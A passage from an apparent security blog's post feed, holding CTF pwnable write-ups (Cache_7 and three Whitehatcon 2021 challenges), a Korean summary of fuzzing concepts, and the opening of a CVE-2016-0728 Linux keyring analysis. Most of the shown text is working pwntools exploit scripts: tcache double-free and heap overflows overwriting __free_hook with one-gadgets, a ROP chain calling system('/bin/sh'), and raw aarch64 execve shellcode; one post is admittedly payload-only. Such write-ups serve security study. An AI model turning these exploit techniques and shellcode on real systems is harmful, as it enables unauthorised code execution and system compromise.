class="line"></span><br><span class="line">pause()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;bye!&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="Cache-7-pwnable"><a href="#Cache-7-pwnable" class="headerlink" title="Cache_7 (pwnable)"></a>Cache_7 (pwnable)</h1><h2 id="vulnerability-3"><a href="#vulnerability-3" class="headerlink" title="vulnerability"></a>vulnerability</h2><p><img src="https://user-images.githubusercontent.com/49066484/113531409-ad360900-9603-11eb-9a03-8f976e9834cd.png" alt="CTF11"></p>
<p>I can’t overwrite plt.got because it is FULL RELRO. I am gonna overwrite _hook address.</p>
<p>Let’s analyze the binary.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531606-29305100-9604-11eb-8fe7-896db2202e74.png" alt="123"></p>
<p>Allocate heap memory  here.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531642-3fd6a800-9604-11eb-83bb-2ee11ad99ae7.png" alt="456"></p>
<p>Free the memory here.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531673-541aa500-9604-11eb-8cec-2bffef0ea6d6.png" alt="789"></p>
<p>And can leak the memory using this.</p>
<p>You know, there is vulnerability about <code>Tcache double free</code> in Ubuntu 18.04 before patching.</p>
<p>And also they gave me the Libc file. It is Libc-2.27, and they gave hint . “Old Ubuntu 18.04”.</p>
<p><img src="https://user-images.githubusercontent.com/49066484/113531879-ed49bb80-9604-11eb-96e6-e007da518756.png" alt="1010"></p>
<p>I tested about it . First I allocated 0x40 size heap. and free the memory three times. The picture above shows that double free is possible.<br>There is no protection about <code>double free</code> in Ubuntu 18.04, but it is patched now.  </p>
<p>Then it is easy to exploit. I use this vulnerability i can leak the memory and also overwrite _hook address. </p>
<h2 id="exploit-3"><a href="#exploit-3" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">  </span><br><span class="line"><span class="comment">#p = remote(&#x27;34.121.211.139&#x27;,4444)</span></span><br><span class="line">p = process([<span class="string">&#x27;./chall&#x27;</span>],env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>:<span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x601050</span></span><br><span class="line">stdin = <span class="number">0x601040</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data\n&#x27;</span>,<span class="built_in">str</span>(data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">add(<span class="number">50</span>,p64(stdin))</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;CCCC&#x27;</span>)</span><br><span class="line">add(<span class="number">50</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">view()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;inside\n&#x27;</span>)</span><br><span class="line">leak = u64(p.recvn(<span class="number">6</span>)+<span class="string">&quot;\x00\x00&quot;</span>)</span><br><span class="line">leak = leak + <span class="number">0x76</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ec680</span></span><br><span class="line">malloc_hook = libcbase + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3c2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAAA&#x27;</span>)</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">free()</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">60</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">60</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">add(<span class="number">60</span>,p64(oneshot))</span><br><span class="line">free()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>




]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>2021 Whitehatcon CTF</title>
    <url>/2021/10/20/2021-10-21-whitehatcon_CTF_2021/</url>
    <content><![CDATA[<center>2021 Whitehatcontest CTF Write-up </center>

<p>I’m very happy that our team came in 24th in this CTF and i solve 3 problems. I write about it a month after the CTF. Actually i forgot how to solve them. that’s why i need to check binary files again. but i lost binary files, could only find payload. So this post has only payload.TT</p>
<span id="more"></span>

<h2 id="chunk-manager"><a href="#chunk-manager" class="headerlink" title="chunk_manager"></a>chunk_manager</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocMem</span>(<span class="params">idx,size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size?\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillMem</span>(<span class="params">idx,offset,data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;in:\n&#x27;</span>,<span class="built_in">str</span>(offset))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:\n&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freeMem</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">allocMem(<span class="number">0</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">1</span>,<span class="number">0x409</span>)</span><br><span class="line">allocMem(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">41</span>,<span class="number">8</span>):</span><br><span class="line">    fillMem(<span class="number">0</span>,i,<span class="string">&#x27;PPPPPPPP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">7</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libcbase = leak - <span class="number">0x3ebca0</span></span><br><span class="line">log.info(<span class="string">&quot;leak: &quot;</span>+<span class="built_in">hex</span>(leak))</span><br><span class="line">log.info(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">oneshot = <span class="number">0x10a41c</span> + libcbase</span><br><span class="line">oneshot = <span class="number">0x4f432</span> + libcbase</span><br><span class="line"><span class="comment">#oneshot = 0x4f3d5 + libcbase</span></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x421</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak heap</span></span><br><span class="line">allocMem(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">4</span>,<span class="number">0x20</span>)</span><br><span class="line">allocMem(<span class="number">5</span>,<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">4</span>)</span><br><span class="line">freeMem(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,<span class="string">&#x27;AAAAAAAC&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">printMem(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">leak = u64(leak+<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line">log.info(<span class="string">&quot;heap: &quot;</span> +<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">fillMem(<span class="number">0</span>,<span class="number">40</span>,p64(<span class="number">0x31</span>))</span><br><span class="line">heapbase = leak - <span class="number">0xc0</span> + <span class="number">0x50</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#overwrite topchunk</span></span><br><span class="line"><span class="comment">#topchunk = leak + 0x410</span></span><br><span class="line">free_hook = libcbase + <span class="number">0x3ed8e8</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;free_hook: &quot;</span> + <span class="built_in">hex</span>(free_hook))</span><br><span class="line"><span class="comment">#log.info(&quot;top_chunk: &quot; + hex(topchunk))</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">fillMem(2,40,p64(0xffffffffffffffff))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">size = (free_hook - 0x20 - 0x10 - topchunk)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">allocMem(9,str(size))</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">allocMem(4,0x200)</span></span><br><span class="line"><span class="string">fillMem(4,0,&#x27;AAAAAAAAA&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">printMem(1)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">fillMem(<span class="number">0</span>,(free_hook-heapbase-<span class="number">0x10</span>),p64(oneshot))</span><br><span class="line"></span><br><span class="line">freeMem(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="string-manger"><a href="#string-manger" class="headerlink" title="string manger"></a>string manger</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./binary&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./binary&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copyString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;copy size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modifyString</span>(<span class="params">data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Content : &#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmpString</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;compare size ? &#x27;</span>,size)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">oneshot</span>):</span></span><br><span class="line">    oneshot = pack(<span class="string">&#x27;&gt;q&#x27;</span>,oneshot)</span><br><span class="line">    oneshot = oneshot[<span class="number">2</span>:]</span><br><span class="line">    oneshot = u64(<span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(oneshot)) + oneshot)</span><br><span class="line">    <span class="keyword">return</span> oneshot</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*<span class="number">80</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">pause()</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line">pause()</span><br><span class="line">cmpString(<span class="built_in">str</span>(<span class="number">55</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;string1 : &#x27;</span>)</span><br><span class="line">leak = p.recvuntil(<span class="string">&#x27; a&#x27;</span>)[-<span class="number">8</span>:-<span class="number">2</span>]</span><br><span class="line">leak = u64(leak+ <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(leak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line">libcleak = pack(<span class="string">&#x27;&gt;q&#x27;</span>,leak)</span><br><span class="line">libcleak = libcleak[<span class="number">2</span>:]</span><br><span class="line">libcleak = u64(libcleak + <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(libcleak)))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(libcleak))</span><br><span class="line"></span><br><span class="line">libcbase = libcleak - <span class="number">0x3fc39f</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;libcbase : &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">oneshot = libcbase + <span class="number">0x10a41c</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f432</span></span><br><span class="line">oneshot = libcbase + <span class="number">0x4f3d5</span></span><br><span class="line"><span class="comment">#overwrite ret</span></span><br><span class="line">ret = libcbase + <span class="number">0x001d84d3</span></span><br><span class="line">system = libcbase + <span class="number">0x4f550</span></span><br><span class="line">binsh = libcbase + <span class="number">0x1b3e1a</span></span><br><span class="line">prdi = libcbase + <span class="number">0x0016609c</span></span><br><span class="line"></span><br><span class="line">system = convert(system)</span><br><span class="line">binsh = convert(binsh)</span><br><span class="line">prdi = convert(prdi)</span><br><span class="line">ret = convert(ret)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">oneshot = pack(&#x27;&gt;q&#x27;,oneshot)</span></span><br><span class="line"><span class="string">oneshot = oneshot[2:]</span></span><br><span class="line"><span class="string">oneshot = u64(b&#x27;\x00&#x27;*(8-len(oneshot)) + oneshot)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print (hex(oneshot))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;BBBB&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(prdi)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += <span class="string">b&#x27;E&#x27;</span></span><br><span class="line"></span><br><span class="line">modifyString(payload)</span><br><span class="line">copyString(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="am"><a href="#am" class="headerlink" title="am"></a>am</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process([&#x27;qemu-aarch64-static&#x27;,&#x27;-L&#x27;,&#x27;/usr/aarch64-linux-gnu&#x27;,&#x27;-g&#x27;,&#x27;1234&#x27;,&#x27;./am&#x27;])</span></span><br><span class="line"><span class="comment">#e = ELF(&#x27;./am&#x27;)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400E14</span></span><br><span class="line"></span><br><span class="line">size = <span class="number">0x412078</span></span><br><span class="line">malloc = <span class="number">0x412088</span></span><br><span class="line">count = <span class="number">0x4120d8</span></span><br><span class="line">syscall = <span class="number">0x400938</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;AAAAAAAA&#x27;</span>*<span class="number">13</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0: &#x27;</span>)</span><br><span class="line"></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[-<span class="number">4</span>:-<span class="number">1</span>]+<span class="string">b&#x27;\x00\x40\x00\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(leak))</span><br><span class="line">stack = leak - <span class="number">0x78</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += shellcode</span><br><span class="line">payload += <span class="string">b&#x27;\x90&#x27;</span>*(<span class="number">0x70</span>-<span class="built_in">len</span>(payload))</span><br><span class="line"><span class="comment">#payload += p64(0x04136b0)</span></span><br><span class="line">payload += p64(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;KEYWORD\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Write-up</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>write-up</tag>
      </tags>
  </entry>
  <entry>
    <title>What The Fuzz! (WTF)</title>
    <url>/2021/10/20/2021-10-21-WTF/</url>
    <content><![CDATA[<center>What the fuzz 간단 정리 </center>

<h2 id="What-is-Fuzzing"><a href="#What-is-Fuzzing" class="headerlink" title="What is Fuzzing?"></a>What is Fuzzing?</h2><ul>
<li>Fuzzing or fuzz testing은 프로그램 내 잠재적 취약점을 찾는데 사용되는 자동화된 SW 기술.</li>
<li>Input이 있는 모든 SW는 Fuzzed 될 수 있음.</li>
</ul>
<span id="more"></span>

<h2 id="Why-Fuzzing"><a href="#Why-Fuzzing" class="headerlink" title="Why Fuzzing?"></a>Why Fuzzing?</h2><ul>
<li>Manual Testing시 tester의 역량에 따라 결과가 달라짐.</li>
<li>사람이 못하는 취약점을 찾을 수 있다.</li>
<li>Application이 복잡할 수록 attack surface가 많아지지만, 사람이 테스트 하기에 어려움.</li>
<li>이미 알려진 취약점이 다시 나오지 않도록 Regression testing 하는 데 사용.</li>
</ul>
<h2 id="Common-issues-with-fuzzing"><a href="#Common-issues-with-fuzzing" class="headerlink" title="Common issues with fuzzing"></a>Common issues with fuzzing</h2><ul>
<li>원하는 종류의 취약점을 발견하는데 까지 시간이 오래 걸릴 수 있다.</li>
<li>Smart Fuzzer(Input 구조를 알고 있는)를 사용하는데 몇 가지 작업이 좀 필요하다.</li>
<li>아무리 좋은 Fuzzer도 모든 취약점을 발견할 수 없다.</li>
<li>Fuzzing 결과에 취약점이 없다 해도 그 프로그램은 100% 안전한 게 아니다.</li>
<li>발견된 취약점은 검증이 반드시 필요하다.</li>
</ul>
<h2 id="What-in-needed-for-fuzzing"><a href="#What-in-needed-for-fuzzing" class="headerlink" title="What in needed for fuzzing?"></a>What in needed for fuzzing?</h2><ul>
<li>Input이 있는 Fuzzing 대상</li>
<li>찾고 싶은 취약점 종류</li>
<li>사용할 Fuzzer</li>
</ul>
<h2 id="What-types-of-bug-can-a-fuzzer-find"><a href="#What-types-of-bug-can-a-fuzzer-find" class="headerlink" title="What types of bug can a fuzzer find?"></a>What types of bug can a fuzzer find?</h2><ul>
<li>이론 상 모든 종류의 취약점을 찾을 수 있음</li>
<li>Logical Bug 보다 Memory Corruption 종류가 찾기 더 쉬움</li>
</ul>
<h2 id="Architecture-of-a-typical-fuzzer"><a href="#Architecture-of-a-typical-fuzzer" class="headerlink" title="Architecture of a typical fuzzer"></a>Architecture of a typical fuzzer</h2><ul>
<li>전형적인 Fuzzer의 3가지 구조.</li>
<li>Test Case Generator - Worker에서 사용할 input을 생성</li>
<li>Logger - bug분석에 필요한 모든 것을 기록 (input, 결과)</li>
<li>Worker - input을 가지고 fuzzing 실행, 버그 탐지</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/49066484/138283140-7d929031-0f20-42ea-bce0-9d7efb2fe0f5.png" alt="fuzzer-architecture"></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><ul>
<li><a href="https://labs.f-secure.com/blog/what-the-fuzz/">https://labs.f-secure.com/blog/what-the-fuzz/</a></li>
</ul>
]]></content>
      <categories>
        <category>Fuzzing</category>
      </categories>
      <tags>
        <tag>fuzzing</tag>
        <tag>theory</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-0728</title>
    <url>/2020/11/02/2020-11-03-CVE-2016-0728/</url>
    <content><![CDATA[<center>CVE-2016-0728 // Linux Kernel 1-day </center>



<h1 id="information"><a href="#information" class="headerlink" title="information"></a>information</h1><p><img src="https://user-images.githubusercontent.com/70257118/95414395-c453b100-0968-11eb-82dd-79b6e5e9e596.png" alt="제목 없음"></p>
<ul>
<li>2016년,리눅스 커널에서 LPE(Local Privilege Escalation)취약점이 발견되었다.</li>
<li>이 취약점은 2012년부터 존재했지만 2016년이 되어서야  취약점이 발견되었다.</li>
<li>당시 수천만대의 Linux 개인 PC와 Server, 66%의 Android device(kit-kat)에 영향을 주었다.</li>
<li>취약점은 32bit,64bit상관없이 발생하며, 4.4.1 버전 이전의 모든 리눅스 커널에서 발생한다.<span id="more"></span>
<img src="https://user-images.githubusercontent.com/70257118/95419567-d4718d80-0974-11eb-97dc-8b0e95991573.png" alt="1"></li>
<li>취약점이 발생하는 환경은 다음과 같으며,  ubuntu 14.04 LTS 환경에서 증명해 보겠다.</li>
</ul>
<h1 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h1><h3 id="Integer-Overflow-trigger"><a href="#Integer-Overflow-trigger" class="headerlink" title="- Integer Overflow (trigger)"></a>- Integer Overflow (trigger)</h3><h3 id="Use-after-free-exploit"><a href="#Use-after-free-exploit" class="headerlink" title="- Use after free (exploit)"></a>- Use after free (exploit)</h3><ul>
<li>Integer Overflow 취약점이 존재하는 부분은 <code>keyctl</code>이라는 커맨드이다.</li>
<li><code>keyctl</code>은 리눅스의 <code>key</code>를 보유 및 관리하는 시스템이다.</li>
<li>keyring은 다른 key(다른 keyring을 포함할 수 있음)에 대한 링크가 포함된 특별한 유형의 key다.</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/70257118/95422776-e48c6b80-097a-11eb-8eb9-d4f58ca5955e.png" alt="2"></p>
<ul>
<li>key는 암호 데이터, 인증 토큰에 대한 구조체이며 아래와 같다.</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> &#123;</span></span><br><span class="line">      <span class="keyword">atomic_t</span>                 usage;       <span class="comment">/* number of references */</span></span><br><span class="line">      <span class="keyword">key_serial_t</span>           serial;        <span class="comment">/* key serial number */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span>      *<span class="title">type</span>;</span>        <span class="comment">/* type of key */</span></span><br><span class="line">      <span class="keyword">time_t</span>                     expiry;  <span class="comment">/* time at which key expires (or 0) */</span></span><br><span class="line">      <span class="keyword">uid_t</span>                       uid;           <span class="comment">/* UID */</span></span><br><span class="line">      <span class="keyword">gid_t</span>                       gid;           <span class="comment">/* GID */</span></span><br><span class="line">      <span class="keyword">key_perm_t</span>            perm;        <span class="comment">/* access permissions */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       quotalen;   <span class="comment">/* length added to quota */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">short</span>       datalen;     <span class="comment">/* payload data length</span></span><br><span class="line"><span class="comment">      char                      *description;</span></span><br><span class="line"><span class="comment">      union &#123;</span></span><br><span class="line"><span class="comment">          unsigned long             value;</span></span><br><span class="line"><span class="comment">          void                            *data;</span></span><br><span class="line"><span class="comment">          struct keyring_list       *subscriptions;</span></span><br><span class="line"><span class="comment">      &#125; payload;                                 /* Actual security data */</span></span><br><span class="line">      ....</span><br><span class="line">      ....</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/70257118/98777101-80eed580-2433-11eb-8d64-248ab5469aa7.png" alt="1"></p>
<ul>
<li><p>해당 취약점에서 중요한 변수는 <code>key-&gt;usage</code>이다.</p>
</li>
<li><p><strong>key-&gt;usage의 type은 atomic_t형으로 이는 int형과 같다.</strong></p>
</li>
<li><p>취약점이 발생하는 함수는 <code>join_session_keyring</code>이다.</p>
</li>
</ul>
<p><img src="https://user-images.githubusercontent.com/70257118/95425267-fa039480-097e-11eb-87b5-4820e5629540.png" alt="55"></p>
<ul>
<li><p>keyctl(KEYCTL_JOIN_SESSION_KEYRING, name)을 이용하여 현재의 세션에서 새로운 keyring을 생성할 수 있다.</p>
</li>
<li><p>name이 NULL일 경우 익명, NULL 이 아닐경우 해당 keyring에 이름을 지정할 수 있다.</p>
</li>
<li><p>keyring은 같은 이름의 keyring을 참조하여 서로 다른 프로세스에서 공유할 수 있다.</p>
